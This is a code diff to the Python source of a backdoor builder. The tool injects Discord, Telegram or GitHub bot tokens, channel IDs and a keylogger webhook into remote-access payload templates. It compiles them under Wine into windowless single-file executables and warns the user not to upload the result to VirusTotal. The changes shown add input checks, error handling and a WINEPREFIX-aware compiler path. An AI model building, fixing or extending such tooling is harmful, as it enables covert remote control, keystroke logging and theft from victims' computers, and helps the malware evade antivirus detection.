@@ -26,7 +26,7 @@ print('''
  ▒▒▓  ▒ ░▓  ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░  ▒ ░░   ░ ▒░▒░▒░ ▒▓▒░ ░  ░░▓   ▒▒   ▓▒█░
  ░ ▒  ▒  ▒ ░░ ░▒  ░ ░  ░  ▒       ░      ░ ▒ ▒░ ░▒ ░      ▒ ░  ▒   ▒▒ ░
  ░ ░  ░  ▒ ░░  ░  ░  ░          ░      ░ ░ ░ ▒  ░░        ▒ ░  ░   ▒   
-   ░     ░        ░  ░ ░                   ░ ░            ░        ░  ░ v2.1.2 (Fixed)
+   ░     ░        ░  ░ ░                   ░ ░            ░        ░  ░ v2.1.2 (Ultimate Fix)
  ░                   ░                                                 
 
 Made by Dimitris Kalopisis aka Ectos | Twitter: @DKalopisis \n\nRun 'help use' to get started!''')
@@ -216,64 +216,74 @@ try:
                     print("[!] Invalid command!\n")
 
         elif command_list[0] == "build":
+            if payload == "":
+                print("[!] Please select a payload first!")
+                continue
+            if settings_list[0] == "None":
+                print("[!] Please set a name for the backdoor!")
+                continue
+
             print("[?] Are you sure you want to build the backdoor? (y/n)")
             choice = input()
             if choice.lower() == "y":
                 print("[+] Building backdoor...")
-                if payload == "discord":
-                    f = open("code/discord/main.py", 'r')
-                    file_content = f.read()
-                    f.close()
-                    newfile = file_content.replace("{GUILD}", str(settings_list[1]))
-                    newfile = newfile.replace("{TOKEN}", str(settings_list[2]))
-                    newfile = newfile.replace("{CHANNEL}", str(settings_list[3]))
-                    newfile = newfile.replace("{KEYLOG_WEBHOOK}", str(settings_list[4]))
-
-                elif payload == "telegram":
-                    f = open("code/telegram/main.py", 'r')
-                    file_content = f.read()
-                    f.close()
-                    newfile = file_content.replace("{BOT_TOKEN}", str(settings_list[2]))
-                    newfile = newfile.replace("{USER_ID}", str(settings_list[1]))
-
-                elif payload == "github":
-                    f = open("code/github/main.py", 'r')
-                    file_content = f.read()
-                    f.close()
-                    newfile = file_content.replace("{TOKEN}", str(settings_list[1]))
-                    newfile = newfile.replace("{REPO}", str(settings_list[2]))
-                
-                temp_py = settings_list[0]+".py"
-                f = open(temp_py, 'w')
-                f.write(newfile)
-                f.close()
-
-                # Fixed path to pyinstaller in Wine
-                path_to_pyinstaller = os.path.expanduser('~/.wine/drive_c/Python38/Scripts/pyinstaller.exe')
-                
-                if not os.path.exists(path_to_pyinstaller):
-                    print(f"[!] PyInstaller not found at {path_to_pyinstaller}")
-                    print("[!] Please run setup.sh first!")
-                    continue
-
-                compile_command = ["wine", path_to_pyinstaller, "--onefile", "--noconsole", "--icon=img/exe_file.ico", temp_py]
-
-                print(f"[+] Running: {' '.join(compile_command)}")
-                subprocess.call(compile_command)
-                
                 try:
-                    os.remove(temp_py)
-                    if os.path.exists(settings_list[0]+".spec"):
-                        os.remove(settings_list[0]+".spec")
+                    if payload == "discord":
+                        f = open("code/discord/main.py", 'r')
+                        file_content = f.read()
+                        f.close()
+                        newfile = file_content.replace("{GUILD}", str(settings_list[1]))
+                        newfile = newfile.replace("{TOKEN}", str(settings_list[2]))
+                        newfile = newfile.replace("{CHANNEL}", str(settings_list[3]))
+                        newfile = newfile.replace("{KEYLOG_WEBHOOK}", str(settings_list[4]))
+
+                    elif payload == "telegram":
+                        f = open("code/telegram/main.py", 'r')
+                        file_content = f.read()
+                        f.close()
+                        newfile = file_content.replace("{BOT_TOKEN}", str(settings_list[2]))
+                        newfile = newfile.replace("{USER_ID}", str(settings_list[1]))
+
+                    elif payload == "github":
+                        f = open("code/github/main.py", 'r')
+                        file_content = f.read()
+                        f.close()
+                        newfile = file_content.replace("{TOKEN}", str(settings_list[1]))
+                        newfile = newfile.replace("{REPO}", str(settings_list[2]))
+                    
+                    temp_py = settings_list[0]+".py"
+                    f = open(temp_py, 'w')
+                    f.write(newfile)
+                    f.close()
+
+                    # Verified path to pyinstaller in Wine
+                    wine_prefix = os.environ.get('WINEPREFIX', os.path.expanduser('~/.wine'))
+                    path_to_pyinstaller = os.path.join(wine_prefix, 'drive_c/Python38/Scripts/pyinstaller.exe')
+                    
+                    if not os.path.exists(path_to_pyinstaller):
+                        print(f"[!] PyInstaller not found at {path_to_pyinstaller}")
+                        print("[!] Please run setup.sh first!")
+                        continue
+
+                    compile_command = ["wine", path_to_pyinstaller, "--onefile", "--noconsole", "--icon=img/exe_file.ico", temp_py]
+
+                    print(f"[+] Running: {' '.join(compile_command)}")
+                    subprocess.call(compile_command)
+                    
+                    try:
+                        if os.path.exists(temp_py): os.remove(temp_py)
+                        if os.path.exists(settings_list[0]+".spec"): os.remove(settings_list[0]+".spec")
+                    except Exception as e:
+                        print(f"[!] Error cleaning up: {e}")
+                    
+                    print('\n[+] The Backdoor can be found inside the "dist" directory')
+                    print('\nDO NOT UPLOAD THE BACKDOOR TO VIRUS TOTAL')
+                    exit()
                 except Exception as e:
-                    print(f"[!] Error cleaning up: {e}")
-                
-                print('\n[+] The Backdoor can be found inside the "dist" directory')
-                print('\nDO NOT UPLOAD THE BACKDOOR TO VIRUS TOTAL')
-                exit()
+                    print(f"[!] Build failed: {e}")
 
         elif command_list[0] == "update":
-            print("[!] Update feature disabled in this version. Please pull from GitHub.")
+            print("[!] Update feature disabled. Please pull from GitHub.")
 
         else:
             print("[!] Invalid command!\n")
